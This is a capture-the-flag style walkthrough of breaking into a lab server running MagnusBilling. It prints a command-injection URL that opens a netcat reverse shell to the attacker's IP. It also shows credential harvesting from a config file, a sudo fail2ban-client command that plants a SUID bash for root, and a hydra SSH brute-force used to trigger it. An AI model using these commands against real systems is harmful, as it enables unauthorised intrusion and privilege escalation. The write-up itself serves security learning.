# Billing

### Billing
Nmap scan finds ports 22,80,.3306 and 5038 open. 

    PORT     STATE SERVICE  VERSION
    22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
    | ssh-hostkey: 
    |   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
    |   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
    |_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
    80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
    | http-title:             MagnusBilling        
    |_Requested resource was http://10.10.51.171/mbilling/
    |_http-server-header: Apache/2.4.56 (Debian)
    | http-robots.txt: 1 disallowed entry 
    |_/mbilling/
    3306/tcp open  mysql    MariaDB (unauthorized)
    5038/tcp open  asterisk Asterisk Call Manager 2.10.6
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Gobuster discovers the following directories: <br />
![image](https://github.com/user-attachments/assets/2660e71b-f82e-486d-b403-eadb74210d1c)<br />
Moving around the website and enumerating directories, I found the following file: <br />
![image](https://github.com/user-attachments/assets/6de3594e-1895-41e4-88a5-c83865d05457)<br />
It means that some software called `MagnusBilling` is running. 
Looking around, I found [this website](https://sploitus.com/exploit?id=1337DAY-ID-39148) that shows a metasploit module to perform command injection. I'm actually not even sure if it works because I don't know how to check the version of this software, but anyway I'll try. <br />
I don't like metasploit really so I'll do it manually. The exploit is basically a command injection on a vulnerable php parameter. To exploit it, I open a netcat listener on port 9001 and then run:

    10.10.26.88/mbilling/lib/icepay/icepay.php?democ=/dev/null;busybox nc 10.11.85.53 9001 -e sh;#
This opens a reverse shell! Moving around the system, I found a configuration file containing a database password: <br />
![image](https://github.com/user-attachments/assets/9514e13a-e182-4f19-b21a-73589dc75bea)<br />
I use this credentials to log into the database. Looking around the DB I found a password: <br />
![image](https://github.com/user-attachments/assets/2ca1144d-1641-482e-924d-381b54baf72d)<br />
I'm trying to crack this hash but it doesn't work. Next, my user has sudo privileges on fail2ban:<br />
![image](https://github.com/user-attachments/assets/831652bb-701c-421a-988b-8b54366f8652)<br />
Fail2ban is an IDS. It is able to detect bruteforce attempts, and can ban IP addresses using iptables rules. <br />
Having sudo privileges on fail2ban can lead to privilege escalation. Basically we can configure fail2ban to execute a specific command on the system whenever it detects bruteforce attempts on a specific service. The format of the command is this: `get <JAIL> action <ACT> actionban`, where JAIL is essentially a service from which it detects a bruteforce, such as ssh, http, etc.. and ACT is the action to perform, for example banning an IP. I'm going to exploit this with the following command: 

    sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "cp /bin/bash /tmp && chmod 4755 /tmp/bash"
An "actionban" can be specified to execute a system command whenever an event happens. So basically we're saying: everytime you detect a bruteforce attack on ssh and you perform the action "iptables-multiport"(which means to ban an IP address on multiple ports), also execute the following command, which creates a SUID copy of /bin/bash.<br />
Now I run `hydra 10.10.196.108 -l root -P /usr/share/wordlists/rockyou.txt ssh`, so that this rule will be triggered, and the SUID `bash` gets created in side `/tmp/bash`.<br />
![image](https://github.com/user-attachments/assets/cc14a930-2dee-43b2-96aa-3d051d94f67f)<br />

